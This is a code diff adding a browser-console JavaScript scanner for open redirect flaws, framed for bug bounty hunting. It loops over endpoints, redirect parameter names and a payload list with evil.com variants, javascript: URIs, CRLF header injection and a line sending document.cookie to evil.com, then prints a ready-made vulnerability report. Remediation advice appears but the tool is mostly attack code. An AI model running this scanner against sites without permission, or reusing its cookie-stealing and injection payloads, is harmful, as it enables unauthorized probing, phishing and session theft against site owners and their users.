@@ -1,0 +1,268 @@
+(async function OpenRedirectScanner() {
+    console.log('%c🔥 Open Redirect Scanner 2026 - Bug Bounty Edition', 'color: #ff3366; font-size: 18px; font-weight: bold');
+    console.log('%cScanning for vulnerabilities...', 'color: #00ff41; font-size: 14px');
+    
+    const vulnerabilities = [];
+    const currentUrl = window.location.href;
+    const baseUrl = window.location.origin;
+    const path = window.location.pathname;
+    
+    // ============= PAYLOAD LIBRARY =============
+    const testPayloads = [
+        'https://evil.com',
+        '//evil.com',
+        '\\\\evil.com',
+        'https://evil.com@trusted.com',
+        'https://trusted.com@evil.com',
+        'https://evil.com.trusted.com',
+        '/\\/evil.com',
+        '////evil.com',
+        'https:evil.com',
+        'http:/evil.com',
+        'javascript:alert(1)',
+        'javascript:alert(document.cookie)',
+        'javascript:fetch("//evil.com?c="+document.cookie)',
+        'data:text/html,<script>alert(1)</script>',
+        '%0d%0aLocation:%20https://evil.com',
+        '%0d%0aSet-Cookie:%20session=hijacked',
+        'https://evil.com%00',
+        'https://evil.com%00@trusted.com'
+    ];
+    
+    // Common redirect parameters
+    const redirectParams = [
+        'redirect', 'next', 'return', 'return_to', 'returnUrl', 'return_url',
+        'redirect_to', 'redirect_uri', 'redirectUrl', 'callback', 'continue',
+        'destination', 'goto', 'url', 'link', 'path', 'target', 'out', 'view',
+        'dest', 'forward', 'fwd', 'to', 'redir', 'redir_url', 'return_path',
+        'success_url', 'failure_url', 'cancel_url', 'error_url', 'logout_url',
+        'login_url', 'register_url', 'reset_url', 'verify_url'
+    ];
+    
+    // Test endpoint patterns
+    const endpoints = [
+        path,
+        '/redirect',
+        '/r',
+        '/go',
+        '/out',
+        '/link',
+        '/url',
+        '/visit',
+        '/click',
+        '/track',
+        '/c',
+        '/redirect?url=',
+        '/logout?redirect=',
+        '/login?next=',
+        '/auth?return_to=',
+        '/oauth/authorize?redirect_uri=',
+        '/api/redirect?url=',
+        '/api/v1/redirect?target='
+    ];
+    
+    // ============= TEST FUNCTION =============
+    async function testRedirect(url) {
+        try {
+            const res = await fetch(url, { 
+                method: 'GET', 
+                redirect: 'manual',
+                cache: 'no-cache',
+                headers: {
+                    'X-Forwarded-Host': 'evil.com',
+                    'X-Redirect-To': 'https://evil.com',
+                    'Referer': 'https://evil.com'
+                }
+            });
+            const location = res.headers.get('location');
+            const refresh = res.headers.get('refresh');
+            
+            if (location && (location.includes('evil.com') || location.includes('javascript:') || location.includes('data:'))) {
+                return { vulnerable: true, type: 'HTTP 302 Redirect', to: location };
+            }
+            if (refresh && (refresh.includes('evil.com') || refresh.includes('javascript:'))) {
+                return { vulnerable: true, type: 'Meta Refresh', to: refresh };
+            }
+            return { vulnerable: false };
+        } catch(e) {
+            return { vulnerable: false };
+        }
+    }
+    
+    // ============= SCAN ALL COMBINATIONS =============
+    console.log(`\n📡 Target: ${baseUrl}`);
+    console.log(`🔍 Testing ${redirectParams.length * testPayloads.length * endpoints.length} combinations...\n`);
+    
+    let tested = 0;
+    for (const endpoint of endpoints) {
+        for (const param of redirectParams) {
+            for (const payload of testPayloads) {
+                let testUrl;
+                if (endpoint.includes('=')) {
+                    testUrl = baseUrl + endpoint + payload;
+                } else if (endpoint.includes('?')) {
+                    testUrl = baseUrl + endpoint + '&' + param + '=' + encodeURIComponent(payload);
+                } else {
+                    testUrl = baseUrl + endpoint + '?' + param + '=' + encodeURIComponent(payload);
+                }
+                
+                const result = await testRedirect(testUrl);
+                if (result.vulnerable) {
+                    vulnerabilities.push({
+                        url: testUrl,
+                        parameter: param,
+                        payload: payload,
+                        redirectType: result.type,
+                        redirectsTo: result.to
+                    });
+                    console.log('%c✅ VULNERABLE!', 'color: #00ff41; font-weight: bold', {param, payload, redirectsTo: result.to});
+                }
+                
+                tested++;
+                if (tested % 100 === 0) {
+                    console.log(`⏳ Progress: ${tested} tests completed...`);
+                }
+                await new Promise(r => setTimeout(r, 30));
+            }
+        }
+    }
+    
+    // ============= SCAN CURRENT PAGE PARAMETERS =============
+    console.log('\n🔍 Scanning current page parameters...');
+    const currentParams = new URLSearchParams(window.location.search);
+    for (const [param, value] of currentParams) {
+        for (const payload of testPayloads.slice(0, 5)) {
+            const newParams = new URLSearchParams(window.location.search);
+            newParams.set(param, payload);
+            const testUrl = baseUrl + path + '?' + newParams.toString();
+            const result = await testRedirect(testUrl);
+            if (result.vulnerable) {
+                vulnerabilities.push({
+                    url: testUrl,
+                    parameter: param,
+                    payload: payload,
+                    redirectType: result.type,
+                    redirectsTo: result.to
+                });
+                console.log('%c✅ VULNERABLE (Current Param)!', 'color: #00ff41', {param, payload});
+            }
+        }
+    }
+    
+    // ============= SCAN FORMS =============
+    console.log('\n🔍 Analyzing forms...');
+    const forms = document.querySelectorAll('form');
+    forms.forEach(form => {
+        const action = form.action;
+        if (action && (action.includes('redirect') || action.includes('next') || action.includes('return'))) {
+            console.log('⚠️ Suspicious form found:', action);
+            vulnerabilities.push({
+                url: action,
+                type: 'Form Action',
+                source: 'HTML Form'
+            });
+        }
+    });
+    
+    // ============= SCAN LINKS =============
+    const links = document.querySelectorAll('a[href*="redirect"], a[href*="next"], a[href*="return"], a[href*="url"]');
+    links.forEach(link => {
+        console.log('⚠️ Suspicious link found:', link.href);
+        vulnerabilities.push({
+            url: link.href,
+            type: 'Link Parameter',
+            source: 'HTML Anchor'
+        });
+    });
+    
+    // ============= GENERATE BUG REPORT =============
+    console.log('\n' + '='.repeat(70));
+    console.log('%c📊 SCAN COMPLETE', 'color: #ff3366; font-size: 16px; font-weight: bold');
+    console.log('='.repeat(70));
+    
+    if (vulnerabilities.length > 0) {
+        console.log(`%c🔴 VULNERABILITIES FOUND: ${vulnerabilities.length}`, 'color: #ff3366; font-weight: bold');
+        console.table(vulnerabilities);
+        
+        // Professional Bug Bounty Report
+        const report = `# 🚨 Open Redirect Vulnerability Report
+
+## Target Information
+- **URL:** ${currentUrl}
+- **Domain:** ${baseUrl}
+- **Date:** ${new Date().toISOString()}
+- **Scanner:** Bug Bounty Redirect Scanner 2026
+
+## Executive Summary
+${vulnerabilities.length} open redirect vulnerabilities were discovered that could be exploited for phishing attacks.
+
+## Vulnerabilities Found
+
+${vulnerabilities.map((v, i) => `
+### ${i+1}. Open Redirect via \`${v.parameter}\` parameter
+- **Vulnerable URL:** \`${v.url}\`
+- **Parameter:** \`${v.parameter}\`
+- **Payload:** \`${v.payload}\`
+- **Redirect Type:** ${v.redirectType || 'N/A'}
+- **Redirects To:** ${v.redirectsTo || 'External domain'}
+
+**Proof of Concept:**  
+\`\`\`
+${v.url}
+\`\`\`
+`).join('\n')}
+
+## Impact
+- Phishing attacks using trusted domain
+- Session hijacking via OAuth redirect_uri
+- Bypass of CSRF protections
+- SSRF in some cases
+
+## CVSS Score
+**6.1 (Medium-High)** - AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+
+## Remediation
+1. Validate redirect URLs against whitelist
+2. Use URL allowlist instead of blocklist
+3. Implement Referer validation
+4. Add warning page for external redirects
+5. Use indirect references for redirects
+
+## Proof of Concept Video
+[Add PoC video/screenshot]
+
+---
+*Report generated by Bug Bounty Redirect Scanner 2026*
+`;
+        
+        console.log('%c📝 Bug Bounty Report Ready:', 'color: #00ff41; font-weight: bold');
+        console.log(report);
+        
+        // Copy to clipboard
+        try {
+            await navigator.clipboard.writeText(report);
+            console.log('%c✅ Report copied to clipboard!', 'color: #00ff41; font-weight: bold');
+        } catch(e) {}
+        
+    } else {
+        console.log('%c🟢 NO VULNERABILITIES FOUND', 'color: #00ff41; font-weight: bold');
+        console.log('\n💡 Manual Testing Tips:');
+        console.log('┌─────────────────────────────────────────────────────────────────┐');
+        console.log('│ 1. Check for redirect parameters in URL: ?redirect=, ?next=    │');
+        console.log('│ 2. Test: ?redirect=https://evil.com                             │');
+        console.log('│ 3. Test: ?next=//evil.com (protocol relative)                   │');
+        console.log('│ 4. Test: ?url=javascript:alert(1)                              │');
+        console.log('│ 5. Check OAuth flows: ?redirect_uri=http://evil.com            │');
+        console.log('│ 6. Test CRLF: ?redirect=%0d%0aLocation:%20evil.com             │');
+        console.log('└─────────────────────────────────────────────────────────────────┘');
+    }
+    
+    console.log('\n%c🎯 BUG BOUNTY TIPS:', 'color: #ff3366; font-weight: bold');
+    console.log('• Report with working PoC URL');
+    console.log('• Show impact (phishing, session theft)');
+    console.log('• Check if redirect_uri validation can be bypassed');
+    console.log('• Test for blind redirects via Referer header');
+    console.log('• Look for cache poisoning opportunities');
+    
+    return vulnerabilities;
+})();
